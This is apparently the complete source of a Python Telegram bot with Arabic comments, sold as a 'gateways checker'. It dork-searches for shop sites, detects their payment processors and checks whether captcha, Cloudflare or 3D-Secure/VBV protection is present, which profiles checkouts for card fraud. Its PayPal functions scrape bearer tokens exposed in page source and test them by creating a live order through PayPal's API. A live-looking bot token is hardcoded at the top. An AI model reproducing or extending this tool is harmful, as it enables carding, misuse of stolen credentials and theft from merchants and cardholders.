import os
import time
import re
import requests
import cloudscraper
import telebot
from telebot import types
from urllib.parse import urlparse
import sys
import io
from datetime import datetime

# --- الإعدادات الأساسية ---
TOKEN = "7707742168:AAGYX7yJBHjm-aVECNFHJ8n68YMPRThD76w"
bot = telebot.TeleBot(TOKEN)

GATEWAYS = {
    "paypal": "PayPal", "stripe": "Stripe", "braintree": "Braintree",
    "square": "Square", "cybersource": "Cybersource", "authorize.net": "Authorize.Net",
    "2checkout": "2Checkout", "adyen": "Adyen", "worldpay": "Worldpay",
    "sagepay": "SagePay", "checkout.com": "Checkout.com", "shopify": "Shopify",
    "razorpay": "Razorpay", "bolt": "Bolt", "paytm": "Paytm",
    "venmo": "Venmo", "pay.google.com": "Google pay", "revolut": "Revolut",
    "eway": "Eway", "woocommerce": "Woocommerce", "upi": "UPI",
    "apple.com": "Apple pay", "payflow": "PayFlow", "payeezy": "Payeezy",
    "paddle": "Paddle", "payoneer": "Payoneer", "recurly": "Recurly",
    "klarna": "Klarna", "paysafe": "Paysafe", "webmoney": "WebMoney",
    "payeer": "Payeer", "payu": "Payu", "skrill": "Skrill"
}

VBV_KEYWORDS = ['3D-Secure', 'threeDSecureInfo', 'VBV', '3DSecure', '3D Secure']
AUTH_PATHS = ['/my-account', '/account', '/login', '/signin']
SECURITY_TERMS = ['captcha', 'recaptcha', "i'm not a robot"]
CLOUDFLARE_TERMS = ["Cloudflare", "cdnjs.cloudflare.com"]

user_api_keys = {}
user_search_results = {}
user_language = {}

# --- دوال الفحص المتقدمة (الجديدة) ---

def verify_paypal_token(token):
    """فحص حقيقي للتوكن عبر API PayPal"""
    if not token:
        return "Not Found ❌"
    
    api_url = "https://api.paypal.com/v2/checkout/orders"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    # محاكاة طلب دفع بسيط جداً للتحقق من الصلاحية
    payload = {"intent": "CAPTURE", "purchase_units": [{"amount": {"currency_code": "USD", "value": "1.00"}}]}
    
    try:
        response = requests.post(api_url, json=payload, headers=headers, timeout=10)
        if response.status_code == 201:
            return "LIVE & VALID ✅"
        elif response.status_code == 401:
            return "EXPIRED/INVALID ❌"
        else:
            return f"RESTRICTED ⚠️ ({response.status_code})"
    except:
        return "CHECK FAILED 🚫"

def extract_paypal_token(html):
    """استخراج توكن PayPal من سورس الصفحة باستخدام Regex"""
    # البحث عن نمط الـ Bearer Token المشهور في PayPal
    patterns = [
        r'A21AA[a-zA-Z0-9\-_]+', 
        r'access_token\$production\$[a-z0-9]+\$[a-f0-9]+'
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(0)
    return None

# --- الدوال المعدلة ---

def fetch_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        scraper = cloudscraper.create_scraper()
        return scraper.get(url, timeout=15) # زيادة الوقت قليلاً لضمان التحميل
    except:
        try:
            if url.startswith('https://'):
                url = 'http://' + url[8:]
                return scraper.get(url, timeout=10)
        except:
            return None
    return None

def detect_gateways(html):
    found = [name for key, name in GATEWAYS.items() if key in html.lower()]
    return found or ["Unknown"]

def check_security(html, domain):
    html_lower = html.lower()
    return {
        'captcha': any(term in html_lower for term in SECURITY_TERMS),
        'cloudflare': any(term in html for term in CLOUDFLARE_TERMS),
        'auth': any(_check_auth_path(domain, p) for p in AUTH_PATHS),
        'vbv': any(re.search(k, html, re.IGNORECASE) for k in VBV_KEYWORDS)
    }

def _check_auth_path(domain, path):
    try:
        return requests.get(f"http://{domain}{path}", timeout=5).status_code == 200
    except:
        return False

def extract_domain(url):
    parsed = urlparse(url if url.startswith(('http://', 'https://')) else 'http://' + url)
    return parsed.netloc or url.split('/')[0]

def format_result(display_url, gateways, security, elapsed, token_status, token_val, user=None):
    domain = extract_domain(display_url)
    display = domain if len(display_url) < 50 else display_url[:50] + "..."
    check_by = f"\n┃•➤ Checked by ➜ [{user.first_name}](tg://user?id={user.id}) 🕷" if user else ""
    
    token_display = f"`{token_val[:25]}...`" if token_val else "None"
    
    return f"""
┏━━━━━━━⍟
┃•Website Analysis ✅
┗━━━━━━━━━━━━⊛
┏━━━━━━━⍟
┃•➤ Site ➜ `{display}` ⎙
┃•➤ Gateways ➜ {', '.join(gateways)} 🍂
┃•➤ Token Status ➜ {token_status}
┃•➤ Found Token ➜ {token_display}
┃•➤ Security ⁞ 
┃   ❁ Captcha ➜ {'✅' if security['captcha'] else '⛔'}
┃   ❁ Cloudflare ➜ {'✅' if security['cloudflare'] else '⛔'}
┃   ❁ Login/Auth ➜ {'✅' if security['auth'] else '⛔'}
┃   ❁ VBV/3D Secure ➜ {'✅' if security['vbv'] else '⛔'}
┗━━━━━━━━━━━━⊛  
┏━━━━━━━⍟
┃•➤ Time ➜ {elapsed}s ⌚️{check_by}
┃•➤ Bot ➜ [Gateways Checker Bot](https://t.me/Jaasemm)  
┗━━━━━━━━━━━━⊛
"""

def check_site(url, user=None):
    start = time.time()
    try:
        resp = fetch_url(url)
        if not resp:
            raise Exception("No response (site may be down)")

        html = resp.text
        domain = extract_domain(resp.url)
        
        # كشف البوابات والحماية
        gateways = detect_gateways(html)
        security = check_security(html, domain)
        
        # فحص التوكن الخاص بـ PayPal حصراً
        found_token = extract_paypal_token(html)
        token_status = verify_paypal_token(found_token) if found_token else "Not Found ❌"
        
        elapsed = round(time.time() - start, 2)
        return format_result(url, gateways, security, elapsed, token_status, found_token, user)
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        return f"❌ Failed to check: {url}\nError: {str(e)} (after {elapsed}s)"

# --- دوال الـ API والبحث (بقيت كما هي مع تحسين طفيف) ---

def test_api_key(api_key):
    try:
        url = "https://www.searchapi.io/api/v1/search"
        params = {'q': 'test', 'engine': 'google', 'api_key': api_key}
        response = requests.get(url, params=params, timeout=10)
        data = response.json()
        if 'error' in data:
            return False, data['error']
        return True, "Valid"
    except Exception as e:
        return False, str(e)

def search_with_dork(query, api_key):
    try:
        url = "https://www.searchapi.io/api/v1/search"
        params = {'q': query, 'engine': 'google', 'api_key': api_key, 'num': 20}
        response = requests.get(url, params=params, timeout=30)
        data = response.json()
        if 'error' in data:
            return data['error'], []
        return format_dork_results(data, query)
    except Exception as e:
        return str(e), []

def search_normal(query, api_key):
    try:
        url = "https://www.searchapi.io/api/v1/search"
        params = {'q': query, 'engine': 'google', 'api_key': api_key, 'num': 20}
        response = requests.get(url, params=params, timeout=30)
        data = response.json()
        if 'error' in data:
            return data['error'], []
        return format_normal_results(data, query)
    except Exception as e:
        return str(e), []

def format_dork_results(data, query):
    if 'organic_results' not in data or not data['organic_results']:
        return "No results found.", []
    results_text = "Advanced Search Results:\n\n"
    urls = []
    for i, result in enumerate(data['organic_results'][:20], 1):
        link = result.get('link')
        if link:
            urls.append(link)
            results_text += f"{i}. {link}\n"
    results_text += f"\nTotal: {len(urls)}\nUse /export to download."
    return results_text, urls

def format_normal_results(data, query):
    if 'organic_results' not in data or not data['organic_results']:
        return "No results found.", []
    results_text = "Normal Search Results:\n\n"
    urls = []
    for i, result in enumerate(data['organic_results'][:20], 1):
        link = result.get('link')
        if link:
            urls.append(link)
            results_text += f"{i}. {link}\n"
    results_text += f"\nTotal: {len(urls)}\nUse /export to download."
    return results_text, urls

def create_txt_file(urls, query):
    if not urls: return None
    filename = f"results_{datetime.now().strftime('%H%M%S')}.txt"
    file_content = f"Query: {query}\nLinks:\n" + "\n".join(urls)
    file_buffer = io.BytesIO(file_content.encode('utf-8'))
    file_buffer.name = filename
    return file_buffer

def get_text(lang, key):
    texts = {
        'ar': {
            'welcome': "اختر القسم الذي تريده:",
            'search_section': "🔍 *استخراج بوابات الدفع*\nالأوامر: /dork, /search, /addkey, /mykey, /status",
            'gateway_section': "🛡 *فحص بوابات الدفع*\nالأوامر: /check <رابط>, /combo",
            'help': "1. استخراج: /dork\n2. فحص: /check\n3. القائمة: /start",
            'choose_language': "🌐 اختر لغتك / Choose language:"
        },
        'en': {
            'welcome': "Choose a section:",
            'search_section': "🔍 *Extraction Section*\nCommands: /dork, /search, /addkey, /mykey, /status",
            'gateway_section': "🛡 *Checker Section*\nCommands: /check <url>, /combo",
            'help': "1. Extract: /dork\n2. Check: /check\n3. Menu: /start",
            'choose_language': "🌐 Choose language:"
        }
    }
    return texts.get(lang, texts['ar']).get(key, '')

# --- Handlers ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    if user_id not in user_language:
        markup.add(types.InlineKeyboardButton("🇮🇶 Arabic", callback_data="lang_ar"),
                   types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en"))
        bot.send_message(message.chat.id, get_text('ar', 'choose_language'), reply_markup=markup)
    else:
        lang = user_language[user_id]
        markup.add(types.InlineKeyboardButton("🔍 Extraction", callback_data="search"),
                   types.InlineKeyboardButton("🛡 Checker", callback_data="gateways"))
        bot.send_message(message.chat.id, get_text(lang, 'welcome'), reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    if call.data.startswith("lang_"):
        user_language[user_id] = call.data.split("_")[1]
        send_welcome(call.message)
    elif call.data == "search":
        bot.edit_message_text(get_text(user_language.get(user_id, 'ar'), 'search_section'), call.message.chat.id, call.message.message_id, parse_mode='Markdown')
    elif call.data == "gateways":
        bot.edit_message_text(get_text(user_language.get(user_id, 'ar'), 'gateway_section'), call.message.chat.id, call.message.message_id, parse_mode='Markdown')

@bot.message_handler(commands=['check'])
def handle_check(message):
    try:
        url = message.text.split()[1].strip()
        msg = bot.reply_to(message, "⏳ Full Analysis in progress (Site + Gateway + Token)...")
        result = check_site(url, message.from_user)
        bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode='Markdown')
    except:
        bot.reply_to(message, "❌ Format: `/check example.com`", parse_mode='Markdown')

@bot.message_handler(commands=['combo'])
def handle_combo(message):
    lines = message.text.split('\n')[1:]
    urls = [line.strip() for line in lines if line.strip()]
    if not urls:
        bot.reply_to(message, "⚠ Put URLs after command (one per line).")
        return
    progress = bot.reply_to(message, f"🔍 Checking {len(urls)} sites...")
    for i, url in enumerate(urls, 1):
        bot.edit_message_text(f"🔍 Progress: {i}/{len(urls)}\nTarget: {url}", message.chat.id, progress.message_id)
        result = check_site(url, message.from_user)
        bot.send_message(message.chat.id, result, parse_mode='Markdown')
        time.sleep(1)
    bot.edit_message_text("✅ Combo analysis completed!", message.chat.id, progress.message_id)

@bot.message_handler(commands=['addkey'])
def add_key(message):
    try:
        key = message.text.split()[1].strip()
        is_valid, msg = test_api_key(key)
        if is_valid:
            user_api_keys[message.from_user.id] = key
            bot.reply_to(message, "✅ Key added successfully!")
        else:
            bot.reply_to(message, f"❌ Invalid Key: {msg}")
    except:
        bot.reply_to(message, "Usage: `/addkey <key>`")

@bot.message_handler(commands=['dork'])
def handle_dork(message):
    user_id = message.from_user.id
    api_key = user_api_keys.get(user_id)
    if not api_key:
        bot.reply_to(message, "❌ Add API Key first using /addkey")
        return
    query = " ".join(message.text.split()[1:])
    if not query:
        bot.reply_to(message, "❌ Usage: /dork <query>")
        return
    msg = bot.reply_to(message, f"🔎 Searching for: {query}")
    res, urls = search_with_dork(query, api_key)
    user_search_results[user_id] = {'urls': urls, 'query': query}
    bot.edit_message_text(res[:4000], message.chat.id, msg.message_id)

@bot.message_handler(commands=['export'])
def handle_export(message):
    data = user_search_results.get(message.from_user.id)
    if not data:
        bot.reply_to(message, "No recent results to export.")
        return
    file = create_txt_file(data['urls'], data['query'])
    bot.send_document(message.chat.id, file)

@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    bot.reply_to(message, "Unknown command. Use /start")

if __name__ == "__main__":
    print("Bot is running... @Hammdn")
    bot.infinity_polling()
